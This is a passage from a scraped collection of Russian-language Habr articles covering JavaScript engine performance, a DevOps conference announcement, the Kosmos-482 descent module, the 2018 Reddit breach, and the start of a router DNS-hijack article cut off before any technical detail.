наоборот.\r\n\r\nArray-Like Object\r\nМы часто сталкиваемся с Array-Like Object — это объекты, которые похожи на массивы, потому что у них есть признак длины. На самом деле они как кот-пират, то есть вроде похожи, но в эффективности потребления рома котик будет хуже, чем пират. Точно так Array-Like Object похож на массив, но не эффективен.\r\n\r\n\r\nДва наших самых любимых Array-Like Object — это arguments и document.querySelectorAII. Есть такие красивые функциональные штуки.\r\n\r\n\r\nУ нас появился map — мы его выдрали из прототипа и вроде бы можем использовать. Но если ему на вход пришел не массив, никакой оптимизации не будет. Наш движок не умеет делать оптимизацию по объектам.\r\n\r\nЧто нужно сделать?\r\n\r\n\r\nОлдскульный вариант — через slice.call() превратить в настоящий массив.\r\nСовременный вариант еще лучше: написать (...rest), получить чистый массив — не arguments — все прекрасно!\r\n\r\nС querySelectorAll то же самое — за счет spread мы можем превратить его в полноценный массив и работать со всеми оптимизациями.\r\n\r\nБольшие массивы\r\nЗагадка: new Array(1000) vs array = []\r\nКакой вариант лучше: создать сразу большой массив и в цикле заполнять его 1000 объектами, или создать пустой и заполнять постепенно?\r\n\r\nПравильный ответ: зависит от.\r\n\r\nВ чем отличие?\r\n\r\n\r\nКогда мы создаем массив первым способом и заполняем 1000 элементов, мы создаем 1000 дырок. Этот массив не будет оптимизирован. Но в него будет быстро писать.\r\n\r\nСоздавая массив по второму варианту, выделяется немного памяти, мы записываем, например, 60 элементов, выделяется еще немного памяти, и т.д.\r\n\r\nТо есть в первом случае быстро пишем — медленно работаем; во втором медленно пишем — быстро работаем.\r\n\r\nСборщик мусора\r\nСборщик мусора тоже немножко ест время и ресурсы. Глубоко не погружаясь, дам самую общую базу.\r\n\r\n\r\n\r\nВ нашей генеративной модели есть пространство молодых и старых объектов. Создаваемый объект попадает в пространство молодых объектов. Через какое-то время запускается очистка. Если объект невозможно достичь по ссылкам от корневого, то его можно собрать в мусор. Если объект еще используется, он перемещается в пространство старых объектов, которое чистится реже. Тем не менее в какой-то момент удаляются и старые объекты.\r\n\r\n\r\nТак работает автоматический сборщик мусора — он сам подчищает объекты, основываясь на том, что к ним нет ссылок. Это два разных алгоритма.\r\n\r\n\r\nScavenge — быстрый, но не эффективный.\r\n\r\nMark-Sweep — медленный, но эффективный.\r\n\r\n\r\nЕсли в Node.js запустить профилирование потребления памяти, то получится примерно такой график.\r\n\r\n\r\n\r\nСначала он скачкообразно растет — это работе алгоритма Scavenge. Потом происходит резкое падение — это Mark-Sweep-алгоритм собрал мусор в пространстве старых объектов. В этот момент все начинает немножко тормозить. Вы не можете этим управлять, поскольку не знаете, когда это произойдет. Вы можете только настроить размеры.\r\n\r\nПоэтому в pipeline есть стадия сборки мусора, которая потребляет время.\r\n\r\n\r\n\r\nЕще быстрее?\r\nЗаглянем в будущее. Что делать дальше, как быть быстрее?\r\n\r\n\r\nНа этой линейке размеры блоков примерно соотносятся в временем, которое он занимают.\r\n\r\nПервое, что приходит в голову людям, которые услышали про байткод — сразу подавать на вход байткод и декодировать его, а не парсить — будет быстрее!\r\n\r\n\r\n\r\nПроблема в том, что байткод сейчас разный. Как я уже сказал: в Safari один, в FireFox другой, в Chrome третий. Тем не менее разработчики из Mozilla, Bloomberg и Facebook выдвинули такой Proposal, но это будущее.\r\n\r\nЕсть другая проблема — компиляция, оптимизация, и повторная оптимизация, если компилятор не угадал. Представим, что есть статически типизированный язык на входе, который выдает эффективный код, и значит уже не нужна повторная оптимизация, потому что то, что мы получили, уже эффективно. Такой вход можно только один раз скомпилировать и оптимизировать. Полученный код будет более эффективным и исполнится быстрее.\r\n\r\nЧто еще можно сделать? Представим, что в этом языке есть ручное управление памятью. Тогда не нужен сборщик мусора. Линейка стала короче и быстрее.\r\n\r\n\r\n\r\nДогадываетесь, на что это похоже? WebAssembly примерно\r\nтак и работает: ручное управление памятью, статически типизированные\r\nязыки и быстрое выполнение.\r\n\r\n\r\nЯвляется ли WebAssembly серебряной пулей?\r\n\r\n\r\nНет, потому что он стоит за JavaScript. WASM пока сам ничего не может делать. У него нет доступа к DOM API. Он внутри движка для JavaScript — внутри того же самого движка! Он все делает через JavaScript, поэтому WASM не ускорит ваш код. Он может ускорить отдельные вычисления, но у вас обмен между JavaScript и WASM будет узким местом.\r\n\r\nПоэтому пока наш язык — это JavaScript и только он, и какая-то помощь из черной коробки.\r\n\r\nИтого\r\nМожно выделить три вида оптимизации.\r\n\r\n  ● Алгоритмические оптимизации\r\n\r\nЕсть статья \"Возможно вам не нужен Rust, чтобы ускорить ваш JS\" Вячеслава Егорова, который когда-то разрабатывал V8, а сейчас разрабатывает Dart. Кратко перескажу её историю.\r\n\r\nБыла библиотека на JavaScript, которая работала не очень быстро. Какие-то ребята переписали ее на Rust, скомпилировали и получили WebAssembly, и приложение стало работать быстрее. Вячеслав Егоров как опытный JS-разработчик решил им ответить. Он применил алгоритмические оптимизации, и решение на JavaScript стало сильно быстрее решения на Rust. В свою очередь те ребята это увидели, сделали те же самые оптимизации, и снова выиграли, но не сильно — зависит от движка: в Mozilla выиграли, в Chrome — нет.\r\n\r\nМы сегодня не говорили про алгоритмические оптимизации, и фронтэндеры о них обычно не говорят. Это очень плохо, потому что алгоритмы тоже позволяют коду работать быстрее. Вы просто убираете ненужные вам циклы.\r\n\r\n  ● Специфичные для языка оптимизации\r\n\r\nЭто то, о чем мы сегодня говорили: наш язык интерпретируемый динамически типизированный. Понимание того, как работают массивы, объекты, мономорфность позволяет писать эффективный код. Это надо знать и писать правильно.\r\n\r\n  ● Специфичные для движка оптимизации\r\n\r\nЭто самые опасные оптимизации. Если ваш очень умный, но не очень общительный, разработчик, который применил очень много таких оптимизаций, и никому о них не рассказал, не написал документацию, то, если вы откроете код, то увидите не JavaScript, а, например, Crankshaft Script. То есть JavaScript, написанный с глубоким пониманием того, как работал движок Crankshaft два года назад. Это все работает, но сейчас уже не нужно.\r\n\r\nПоэтому такие оптимизации обязательно должны быть задокументированы, покрыты тестами, доказывающими их эффективность в данный момент. За ними надо следить. К ним нужно переходить только в тот момент, когда вы где-то реально замедлились — прямо никак не обойтись без знания таких глубинных устройств. Поэтому кажется логичной знаменитая фраза Дональда Кнута.\r\n\r\n\r\nНе нужно пытаться внедрить какие-то жесткие оптимизации только потому, что вы про них прочитали положительные отзывы.\r\n\r\nТаких оптимизаций надо бояться, обязательно документировать и оставлять метрики. Вообще всегда собирайте метрики. Метрики — это важно!\r\n\r\nПолезные ссылки:\r\n\r\n\r\n Тезисы и презентация доклада \r\n What’s up with monomorphism? \r\n What makes WebAssembly fast? \r\n Путь к пониманию байт-кода V8 \r\nДевшахта: Хардкор\r\n\r\nНа Frontend Conf Moscow  4 и 5 октября будем разбирать еще больше сложных случаев и залезем во внутренности еще большего числа популярных инструментов. Подавайте заявки до 15 августа, и смотрите, что интересное уже в списке:\r\n\r\n\r\nТимофей Лавренюк (KeepSolid) планирует рассказать, как разработать полностью Offline First приложение с использованием Persistent Storage\r\n Антон Хлыновский (TradingView) обещает познакомить слушателей с основами WebGL и WebAssembly и показать, как написать на их основе несложное визуальное приложение, используя только базовый API.\r\n Из доклада Алексей Чернышев Алексея узнаем, как реализовать многопользовательское редактирование текста в реальном времени наподобие Google Docs.\r\n \r\n", "images": [{"img": "https://habrastorage.org/webt/iy/2r/ke/iy2rkenolmtnchwu_whyurlrw80.jpeg"}, {"img": "https://habrastorage.org/webt/rd/-o/q7/rd-oq7q2m9bjipzyqo1l3jrlqti.jpeg"}, {"img": "https://habrastorage.org/webt/le/oy/yg/leoyyg4b8ru_n_2djyzkg6hbe1a.jpeg"}, {"img": "https://habrastorage.org/webt/wj/n0/us/wjn0ustvepwu4kmulit2v6xxtsy.jpeg"}, {"img": "https://habrastorage.org/webt/3i/1p/y-/3i1py-dcnwj6enma0zveqcv67tq.jpeg"}, {"img": "https://habrastorage.org/webt/wl/ct/8e/wlct8ejmclt1hoqiinm9jwbayyg.jpeg"}, {"img": "https://habrastorage.org/webt/i6/cj/zh/i6cjzhohklmcdyenrvrjmdw6fyk.jpeg"}, {"img": "https://habrastorage.org/webt/h4/bf/d-/h4bfd-9twvmsqlk-euvv34he48u.jpeg"}, {"img": "https://habrastorage.org/webt/zp/ma/oo/zpmaoosvxia3btjyxstyyaq5nnc.jpeg"}, {"img": "https://habrastorage.org/webt/qz/wo/2x/qzwo2xg_2ju3fafi6hb4y8ssm24.jpeg"}, {"img": "https://habrastorage.org/webt/w5/tu/u4/w5tuu4i3irrzbsck7e2ohdnzgai.jpeg"}, {"img": "https://habrastorage.org/webt/7e/ms/yd/7emsydqevnntiujqhsa_rtrvdec.jpeg"}, {"img": "https://habrastorage.org/webt/8b/0l/zi/8b0lzi2wb8mqqbsetc88t2lsale.jpeg"}, {"img": "https://habrastorage.org/webt/kx/kv/l5/kxkvl5nr4j2cxe5d6kuhwegffnk.jpeg"}, {"img": "https://habrastorage.org/webt/yr/ky/sk/yrkyskmi_annr0w3jnps13y5alc.jpeg"}, {"img": "https://habrastorage.org/webt/vu/is/fh/vuisfhp0lin_et7pozzqny-g6q0.jpeg"}, {"img": "https://habrastorage.org/webt/vv/4g/i6/vv4gi6zw_zrtlsgl5lsb7ebqqza.jpeg"}, {"img": "https://habrastorage.org/webt/mk/1t/vr/mk1tvrgq5h2l7mp72g4p6vg6wlm.jpeg"}, {"img": "https://habrastorage.org/webt/4i/ia/bs/4iiabsuemjg-7nu0yiywvlsd9hc.jpeg"}, {"img": "https://habrastorage.org/webt/02/dn/nj/02dnnjtvkqa7fn87e8ioa3kwgpy.jpeg"}, {"img": "https://habrastorage.org/webt/ck/53/ny/ck53nyrhuj7ihixe7vi7ds_vjvc.jpeg"}, {"img": "https://habrastorage.org/webt/qb/rw/zf/qbrwzflusrdjbboqwgsth1ezozu.jpeg"}, {"img": "https://habrastorage.org/webt/uf/f4/u_/uff4u_bbjb3elwmhhor3lv2tiwm.jpeg"}, {"img": "https://habrastorage.org/webt/i7/_j/ul/i7_juluulfkpnerhxwnif4tjnoa.jpeg"}, {"img": "https://habrastorage.org/webt/fg/8e/1c/fg8e1csx9x1mo4y2hlvuzzjvgem.jpeg"}, {"img": "https://habrastorage.org/webt/ac/rd/1l/acrd1lqmylajg5b3crff97j-9h8.jpeg"}, {"img": "https://habrastorage.org/webt/yp/uj/1b/ypuj1bus74-w473vsmczkvgwi0s.jpeg"}, {"img": "https://habrastorage.org/webt/zi/_3/ya/zi_3yao0kydtrtagdizs4oklcr0.jpeg"}, {"img": "https://habrastorage.org/webt/ts/vc/fz/tsvcfzihzzewt_udo-39cjqea8c.jpeg"}, {"img": "https://habrastorage.org/webt/7i/lf/xd/7ilfxdfdm0dbkdknw0ecpushflo.jpeg"}, {"img": "https://habrastorage.org/webt/e0/36/ut/e036utlk16ybet20xbica5qziey.jpeg"}, {"img": "https://habrastorage.org/webt/qf/cd/8h/qfcd8hamo_iv_fznbksf35whw9q.jpeg"}, {"img": "https://habrastorage.org/webt/ke/ip/pd/keippdq9hmpt3ueb7-kgd-zt1ig.jpeg"}, {"img": "https://habrastorage.org/webt/yx/xo/1u/yxxo1uda9lkq9fim_uy9zzylxlw.jpeg"}]}, {"header": "Встречайте DevOpsConf Russia", "text": "Принципы DevOps плотно проникли в жизнь разработчиков, и, хотя разночтений в понятиях меньше не стало, сообществу нужно отдельное большое мероприятие для обмена опытом. Им станет конференция DevOpsConf Russia.\r\nDevOpsConf Russia состоится 1 и 2 октября в Москве, соберет 500 специалистов и будет логически продолжать серию RootConf. Мы шли к этому перевоплощению несколько лет, и наконец готовы все рассказать.\r\n\r\n\r\nВ 2015 году в рамках фестиваля РИТ++ мы возродили конференцию RootConf, чтобы привлечь интерес к современным инструментам эксплуатации и подходам DevOps.\r\nКрупные проекты стали состоять и многих компонентов, наборы микросервисов начали заменять собой монолиты. Разрабатывать и поддерживать такие системы без глубокого понимания сразу всех аспектов: архитектуры, технологии поставки, среды эксплуатации, особенностей железа — стало неэффективно.\r\nСледуя этим требованиям, тематика RootConf охватывала все вопросы эксплуатации:\r\n\r\n Технологии виртуализации и контейнеризации.\r\n \r\n Управление конфигурацией.\r\n \r\n Непрерывное развертывание и деплой.\r\n \r\n Логирование и мониторинг.\r\n \r\n Технологии отказоустойчивости и катастрофоустойчивости.\r\n \r\n\r\nВ то же время, мы постепенно добавляли DevOps содержание. За это время само понятие DevOps стало гораздо более распространено. Хотя распространение привело к размытию границ, в общих чертах подход стал более интересен и понятен сообществу. Описание «RootConf — конференция по эксплуатации и DevOps» теперь не отражает наш взгляд на вещи.\r\n\r\n\r\nDevOps — это объединение процессов разработки, тестирования и эксплуатации вместе. Весь технологический процесс развития проекта не состоит из отдельных этапов, все части тесно переплетаются и идут параллельными курсами, а сам процесс в парадигме DevOps становится совсем другим.\r\nПодробнее о том, зачем все это нужно и куда двигается, обсуждали в интервью перед Highload++ Siberia.\r\nСообщество выросло настолько, что мы, во-первых, решили отделить конференцию от фестиваля. Во-вторых, дать ей новое, правильное название — DevOpsConf Russia. Перевоплощение пройдет 1 и 2 октября в Москве в Инфопространстве, и мы приглашаем принять в этом участие.\r\nТематика\r\nНа будущей конференции мы не хотим говорить только об эксплуатации, нам интересно целостное восприятие и инженерные практики, позволяющие реализовать такой подход.\r\nОсновное послание, которое мы хотим донести на конференции DevOpsConf — применение DevOps подхода требует других взглядов на весь процесс разработки.Эти 9 групп тем, которые полно описывают DevOps, и которые осветим на конференции:\r\n\r\n Инфраструктурная платформа.\r\n \r\n Инфраструктура как код.\r\n \r\n Непрерывная поставка.\r\n \r\n Обратная связь.\r\n \r\n Архитектура в DevOps, DevOps для CTO.\r\n \r\n SRE-практики.\r\n \r\n Обучение и управление знаниями.\r\n \r\n Безопасность, DevSecOps.\r\n \r\n DevOps-трансформация.\r\n \r\n\r\nРанее привычные темы CI/CD, мониторинга и надежности укладываются в новую структуру, но рассматриваются с другого угла. Они становятся кирпичиками, из которых собирается большая инфраструктура. Отдельные технологические решения органично вписываются в общий процесс.\r\nДля кого конференция\r\nПольза будет на любой вкус, участники смогут:\r\n\r\n узнать о технологических новинках и том, как их использовать;\r\n \r\n увидеть практические кейсы DevOps на выступлениях и мастер-классах;\r\n \r\n пообщаться со специалистами, которые практикуют DevOps и обменяться опытом;\r\n \r\n узнать о DevOps практиках и сравнить их с принятыми в собственной компании.\r\n \r\n\r\nДля тех, кто уже работает в парадигме DevOps, будут доклады с глубоким погружением в тему и важными подробностям, и обсуждения новинок. Если же вы только в начале пути, то это будет отличной возможностью посмотреть на реальные работающие примеры от старта и до успешного внедрения. Вы увидите, как разработка, тестирование и эксплуатация могут быть нераздельны.\r\nОбобщая, участие будет интересно:\r\n\r\n разработчикам, которые работают внутри DevOps процесса;\r\n \r\nsoftware engineer in test, т.е. людям, которые занимаются процессом автоматизации тестирования;\r\nsoftware reliability engineer и тем, кто создает инфраструктурную платформу;\r\nCTO и управленцам высшего звена;\r\nи всем, кто хочет знать, как устроен DevOps у других.\r\n\r\nКонференция нужна и тем, кто еще верит, что DevOps делает DevOps-отдел из DevOps-инженеров (этот и другие мифы мы постарались убедительно разрушить еще в прошлом году).\r\n\r\n\r\nCall for Papers\r\nПрограммный комитет ждет заявки до 15 августа. Нам важно раскрыть тему с разных сторон, поэтому мы готовы собирать паззл из частных фрагментов. Если DevOps в вашей компании еще не реализован полностью, но на пути вы уже разработали решения отдельных задач из нашей классификации, мы с удовольствием рассмотрим такой доклад.\r\nЛюбую, даже частичную практику, можно раскрыть, и передать таким образом ценный опыт. Программный комитет поможет в этом, у нас есть отработанный процесс уточнений, комментариев, прогонов и тренингов по выступлению. Не лишне повторить, что и в первый раз выступать на наших конференциях можно успешно, но придется потратить время на подготовку.\r\nНе забудьте, что на конференции всегда есть место и менее формальным, но более интерактивным, видам взаимодействия спикеров и участников.\r\n\r\n\r\nПрограмма\r\nРабота над программой уже вовсю идет. Ниже несколько классных заявок, над которыми спикеры вместе с Программным комитетом уже неплохо потрудились.\r\nГде застревает софт? \r\nГибкое управление, бережливое управление, непрерывная интеграция, наконец -DevOps! Чего только мы не предпринимали для оптимизации сроков доставки ПО. Преимущество DevOps-принципов заключается в том, что они собрали в себе весь предыдущий опыт. \r\n\r\nАнтон Вайс (Отомато) полагает, чтоDevOps зиждется на системном анализе и измерениях, вместе с ним на конференции мы рассмотрим все части конвейера доставки ПО и обсудим: что измерять, как измерять, как использовать системный анализ для выявления этих узких мест, и как это поможет вам в оптимизации сроков доставки ценности вашей ИТ-организации.\r\n\r\n\r\n\r\nВнутренняя архитектура Kubernetes\r\nБольшинство ресурсов про Кубернетес описывают его как фантастическую технологию, данную нам волшебниками из Гугла. Возможно, это и правда классная штука, но администраторы знают: солнце встает на востоке, и сложные распределенные системы отказывают в продакшне.\r\nBen Tyler работает в Booking.com над системой контролируемого выпуска приложений на множество кластеров. Бен поможет составить рабочее представление о главных компонентах Кубернетеса и взаимодействии между ними.\r\n\r\n\r\n\r\nRevenue Based Monitoring\r\nВасилий Озеров (fevlake) предлагает взглянуть на мониторинг шире, чем обычно. Все собирают множество технических показателях и некоторые бизнес-метрики: revenue, retention, quality. К сожалению, очень часто эти метрики анализируются отдельно друг от друга, и никто не пытается их соотнести. Знаете ли вы, сколько денег вам приносит веб-сервер. Как увидеть проблемы, когда все системы технического мониторинга горят зеленым? Сколько денег теряет бизнес, когда база данных загружена на 90%? А на 50%? Приходите – будем разбираться.\r\n\r\nTerraform best practices with examples and arguments\r\nАнтон Бабенко активно участвует в Open Source проектах, самый популярный их которых, terraform-aws-modules скачан миллион раз. Из доклада на DevOpsConf вы сможете узнать из первых рук о многих подробностях: best practices использования Terraform, плюсы и минусы структуры кода, трюки и подводные камни. Главное, Антон обещает показать примеры кода, работающего везде: от небольших проектов до очень больших инфраструктур. Если вы уже используете Terraform, то это отличная возможность получить практические советы.\r\n\r\n\r\nПриходите участвовать\r\nМы заполним эти два дня — 1 и 2 октября — DevOps под завязку. Представим 30 докладов для разностороннего освещения темы, проведем 20 митапов и мастер-классов для полного погружения в тему, организуем дискуссии с экспертами, приготовим вечернюю программу для неформального общения.\r\nУчастники наших конференций всегда отмечают важность профессионального общения. Мы создаем среду для эффективного нетворкинга и стараемся, чтобы посещение оставило только положительные эмоции.\r\nДо встречи на DevOpsConf Russia 1 и 2 октября в Москве в Инфопространстве. Заявки на выступления принимаются до 15 августа. Билеты можно забронировать и позже, но чем ближе, тем дороже.\r\n", "images": [{"img": "https://habrastorage.org/webt/g7/bo/pp/g7boppibyspam67qr2qg-ykh6ym.png"}, {"img": "https://habrastorage.org/webt/_u/0g/jc/_u0gjcnal3rowd-uwiqllcimzbq.png"}, {"img": "https://habrastorage.org/webt/tr/dn/mv/trdnmv8ipgnneraanl6dmllx9zs.png"}, {"img": "https://habrastorage.org/webt/g7/1p/sz/g71pszlpsrtsmdjjktqrpjlhfps.png"}, {"img": "https://habrastorage.org/webt/l4/hq/hx/l4hqhxettdh6yk6whnvozckbrxe.png"}, {"img": "https://habrastorage.org/webt/r9/-u/-r/r9-u-rz-ggmwchkkqx5mkkdr0fq.png"}, {"img": "https://habrastorage.org/webt/d-/ds/yi/d-dsyigdizcgxs7ed9ibjw7nhno.png"}, {"img": "https://habrastorage.org/webt/jn/sw/fx/jnswfx_wde2hxuldgnnuofamyye.png"}]}, {"header": "Возвращение советской станции. Анализ и документы", "text": "\r\n\r\nЭто продолжение истории советской межпланетной станции, что снова к нам вернется. Начало здесь.\r\n\r\nЧем мне нравятся подобные дискуссии, так это тем, что при мозговом штурме можно многое уточнить. И новая информация действительно интересная.\r\n\r\n Для начала, Игорь Лисов (обозреватель журнала «Новости Космонавтики») верно указал на то, что в прошлой статье я не проанализировал судьбу всех объектов, что оказались в космосе в 1972 году. Я процитирую его анализ полностью:\r\n \r\nПо итогам запуска 31 марта 1972 г. в американский каталог было внесено четыре объекта сразу и пятый — через три месяца. \r\n\r\n5920 (1972-023B) — третья ступень РН «Молния-М», сошла с орбиты 01.04.1972 \r\n5921 (1972-023C) — блок обеспечения запуска РБ, сошел с орбиты 02.04.1972 \r\n5922 (1972-023D) — разгонный блок, RCS=8.3 m2, сошел с орбиты 20.02.1983 \r\n5919 (1972-023A) — Космос-482, RCS=9.7 m2, сошел с орбиты 05.05.1981 \r\n6073 (1972-023E) — официально считается фрагментом средства выведения, но, вероятно, в действительности является спускаемым аппаратом КА, RCS=0.82 m2, находится на орбите и является героем рассматриваемой статьи. \r\n\r\nТаким образом, падает не советская АМС как таковая, а ее спускаемый аппарат. По крайней мере, в первом приближении видится так.\r\n\r\nС первыми объектами мы, по сути, разбирались в прошлой статье. Замечание про разгонный блок тоже логичное. Действительно, после завершения работы блока «Л» он должен был отделиться от межпланетной станции и сойти с орбиты, так как был очень легким/громоздким.\r\n\r\nГораздо интереснее появление объекта 6073. Первая TLEшка на него (что я нашел) датируется 5 июля. Через три месяца после запуска станции. Это достаточно близко к дате достижения станцией Венеры, если бы она вышла на межпланетную траекторию. Ее близнец, «Венера-8», вошла в атмосферу Венеры 22 июля.\r\n\r\nЕсли предположить, что станция все это время работала (почему бы и нет?), находясь в солнечной ориентации, то также можно предположить, что в автоматике станции подобное разделение было прописано, как реакция на прекращение работоспособности перелетного блока. Например, окончания запасов азота для ориентации. Режим работы на орбите Земли должен отличатся от межпланетного, и азот уходит куда быстрее.\r\n\r\nНо это только версия. Тем более что есть информация, противоречащая ей. На сайте Анатоля Зака есть снимок станции, что передал ему астрофотограф Ральф Вандерберг в 2011 году.\r\n\r\n\r\n\r\nИ по нему выходит, что станция все-таки не разделилась.\r\n\r\nВпрочем, лично мне анализ Игоря Лисова кажется более логичным. Он подкреплен баллистическими коэффициентами и оценкой яркости. Есть информация, что яркость объекта слабо меняется от фазы. Что подтверждает версию о шаре. Но тогда не ясно, что сфотографировал Ральф.\r\n\r\nКонечно, это все мало меняет именно для нас. Мы и так ждали возвращение спускаемого аппарата. Он сейчас и летает в космосе. Ситуация может измениться только относительно времени его возвращения. Спускаемый аппарат одновременно тяжелый и компактный. Такие слабо тормозятся об атмосферу. Я вел прошлую оценку исходя из мнения, что станция может пережить следующий пик солнечной активности только после заметного падения апогея. После которого долго не пролетает. Спускаемый аппарат может дотянуть и до следующего пика. То есть время его жизни может увеличиться еще на 11 лет. Дальше уже вряд ли.\r\n\r\n\r\n\r\nТем не менее, в истории со станцией есть определенная недосказанность. На момент прошлой статьи я работал в архиве, и хоть основной целью была Луна, заказал и несколько подшивок документов, посвященных исследованию Венеры. Честно скажу, целью был поиск документов, в которых пояснялось, что случилось с разгонным блоком. Должны же были тогда разобраться, почему он выключился раньше времени! Увы. Именно этого я не нашел. В архиве оказалось только техническое задание на станцию В-72, два отчета с заседания госкомиссии и одно испытание парашюта станции. Их я вынес в ссылку в конце статьи. Документы оказались интересными хотя бы тем, что отвечают на часть вопросов, что задавали о посадке станции. А именно:\r\n\r\n1. Без парашюта спускаемый аппарат разобьется.\r\n\r\nНет. Возможно, так и будет. Мало ли, что произошло с ним за эти годы. Но если оценивать исключительно по техническому заданию, лично я нахожу это маловероятным.\r\n\r\nВот цитата из ТЗ:\r\n\r\n\r\n\r\nДаже при 70 атм расчетные перегрузки были 100 g. При одной атмосфере они должны быть заметно выше. При том, что посадка на утрамбованный песок и для Земли допустимое условие.\r\n\r\n2.Возможно выйдет парашют. Вдруг там механический датчик?\r\n\r\nЗдесь, к сожалению, плохие новости. Точнее я не могу сказать, какой там применен датчик. В ТЗ это не описывалось. Только отметили, что механизм отстрела крышки парашютного контейнера изменен. В венерианской атмосфере парашют выходил на высоте 64 км от поверхности Венеры. Это около 0.1атм, что соответствует 16 км от поверхности Земли. То есть, если бы он вышел, высота была бы достаточная для торможения. \r\n\r\nТеперь ложка дегтя. Мною был обнаружен отчет с испытанием парашюта. Прямая ссылка\r\n\r\nЕсли быть кратким, то при нагреве парашюта со станций В-72 было обнаружено, что при высоких температурах он начинает гореть и превращаться в стекловидную массу с низкой прочностью. Что, конечно, было бы катастрофой. Но было выяснено, что в постановке эксперимента – ошибка, и подобный процесс происходит только в кислородной атмосфере. В углекислой атмосфере Венеры никакого окисления не происходит, и парашют не теряет свою прочность. \r\n\r\nДругими, словами в нашей атмосфере из-за высокой температуры, полученной при входе в атмосферу, парашют может начать окисляться, а при окислении выделятся еще больше энергии. Теплозащита станции должна выдержать, а вот парашют превратится в стекловидную массу. Увы, даже если там некий механический датчик, то даже при его срабатывании уже может быть нечего выпускать.\r\n\r\n3. Мы не узнаем, где упадет станция\r\n\r\nСейчас — конечно. Но когда спускаемый аппарат будет накручивать последние витки вокруг Земли, ситуация сильно изменится. Для начала, вход в атмосферу произойдет в районе перигея. Долготу точки входа можно будет понять по координатам долготы восходящего узла. В целом, предсказать последние витки аппарата можно будет уже по TLEшкам. И, соответственно, выдать координаты входа в атмосферу для нескольких следующих витков. Спускаемый аппарат сферический — аэродинамического качества нет. Из-за чего координаты посадки будут просто немного смещены относительно точки входа, по направлению витка.\r\n\r\nТак что будем ждать.\r\n\r\nМатериалы 72 года я вынес в отдельную ссылку.", "images": [{"img": "https://habrastorage.org/webt/gu/vz/oq/guvzoqlpb3qduekyvm9bizshkei.jpeg"}, {"img": "https://habrastorage.org/getpro/habr/post_images/262/638/2ff/2626382ff2361657d315ea078a68adc7.jpg"}, {"img": "https://habrastorage.org/webt/7d/ml/l3/7dmll3dtf1utn2q-hddwgy0qcyy.jpeg"}, {"img": "https://habrastorage.org/webt/ts/az/v2/tsazv2v4xrksv8qzowhlzdxh1ye.jpeg"}]}, {"header": "Reddit взломан, утекла база с паролями и email за 2005-2007 годы", "text": "Один из крупнейших социальных хабов интернета, Reddit, в среду заявил о проникновении в свою сеть киберпреступников. \r\n\r\nЗлоумышленникам удалось получить доступ к различным данным: базе с email-адресами и паролями пользователей, зарегистрированных с 2005 по 2007 год, электронные письма пользователей, исходные коды, внутренние файлы и «все данные Reddit с 2007 года». Сообщается, что инцидент имел место между 14 и 18 июня 2018 года, и проникновение обнаружили 19 июня. Злоумышленники скомпрометировали нераскрываемое число сотрудников Reddit и проникли в «несколько систем», получив доступ к данным. \r\n\r\n\r\nИллюстрация от theguardian.com\r\n\r\nПредставители Reddit официально признали факт взлома и изложили суть произошедшего в своем блоге:\r\n19 июня нам стало известно, что хакер скомпрометировал несколько учетных записей Reddit с доступом к облаку и исходному коду, перехватив коды проверки двухфакторной аутентификации, которые пришли по SMSМы сотрудничаем с правоохранительными органами, делаем необходимое для устранения последствий текущей ситуации, а также постараемся сделать все, чтобы избежать подобных инцидентов в будущем. Пострадало лишь небольшое количество пользователей, которых мы уже успели уведомить\r\n\r\n\r\nХакеры добрались вчастности до бэкапа БД, датированного маем 2007 года. Reddit был основан и заработал в 2005 году, и этот бэкап БД содержал всю информацию за два года работы сайта, в том числе весь его контент и сообщения пользователей (включая личные), а также хешированные пароли и соли для хэшей, актуальные на момент создания бэкапа.\r\n\r\nПредставители компании утверждают, что преступники не получили доступа на запись на скомпрометированных серверах, а значит, не могли модифицировать какие-либо важные данные. Тем не менее, разработчики все равно усилили безопасность (в частности сменили ключи API) и мониторинг.\r\n\r\nТак же хакерам повезло добраться и до более свежих email-дайджестов, отправленным между 3 июня и 17 июня 2018 года. Эти подборки рекомендуемых постов для читателей портала содержат информацию о пользовательских именах и связанных с ними почтовых адресах.\r\n\r\nСбой двухфакторной аутентификации на основе SMS\r\nReddit использует обычную двухфакторную аутентификацию на основе SMS, чтобы защитить свои учетные записи сотрудников, требуя ввода одноразового кода доступа вместе с именем пользователя и паролем.\r\n\r\nОднако, как сообщил Reddit, именно эти текстовые сообщения хакеры и перехватили\r\n\r\nКейт Грэм (Keith Graham), главный технический специалист SecureAuth + Core Security, прокомментировал ситуацию для the Guardian: «Хотя аутентификация на основе SMS популярна и гораздо более безопасна, чем просто пароль, широко известно, что она достаточно уязвима для злоумышленников, которые, используя ее бреши, уже взломали многих знаменитостей.\r\n\r\nГрэхем объяснил, что киберпреступники способны получить доступ к номеру телефона, на который отправляется двухфакторный код SMS:: «Например, киберпреступник просто может предоставить представителю компании мобильной связи адрес жертвы, последние 4 цифры номера социального страхования и, возможно, кредитную карту для трансфера номера мобильного телефона.\r\n\r\n«Это та информация, которая широко доступна в даркнете благодаря предыдущим утечкам баз данных, например Equifax».\r\n\r\nПоследствия\r\nНекоторые вопросы вызывает тот факт, что если инцидент с безопасностью был обнаружен еще 19 июня 2018 года, то публично о нем сообщили лишь 1 августа 2018, т.е. более чем месяц спустя. Еще один интересный момент, в комментариях к новости об инциденте администраторы ресурса рассказали, что \"наняли своего самого первого руководителя службы безопасности, и он начал работу всего 2,5 месяца назад\".\r\n\r\nНа данный момент скомпрометированные аккаунты пользователей всё ещё действуют, но их обладателям отправлены письма с инструкцией об изменении пароля.\r\n\r\nКроме того, администраторы реддита ввели усовершенствованную двухфакторную аутентификацию для доступа к конфиденциальным данным. Пользователям Reddit рекомендовано сбросить и установить стойкий уникальный пароль и настроить подтверждение входа помощью кода, генерируемого приложением, а не через SMS.", "images": [{"img": "https://habrastorage.org/getpro/habr/post_images/12a/978/54b/12a97854b53534447956b621d35293c3.jpg"}]}, {"header": "По следам взлома tp-link", "text": "Взлом с подменой dns достаточно распространенный способ атаки. В первую очередь из-за его простоты. Суть атаки в изменении адреса dns в настройках сетевого оборудования жертвы на адрес dns-сервера злоумышленника с целью возврата ложных ip. А уже далее, кто во что горазд — от банальных фишинговых страничек соцсетей для кражи паролей до якобы провайдерской заглушки с требованиями оплаты.\r\n\r\nСамое интересное во всем этом я считаю способы, с помощью которых боты, так или иначе, попадают на роутеры. И сегодня я про один из таких способов расскажу.\r\n\r\nЧто имеем: \r\n\r\n\r\nНовенький роутер Archer c20v4, только из коробки, с последней официальной прошивкой.\r\nВнешний ip адрес на wan интерфейсе и открытый web 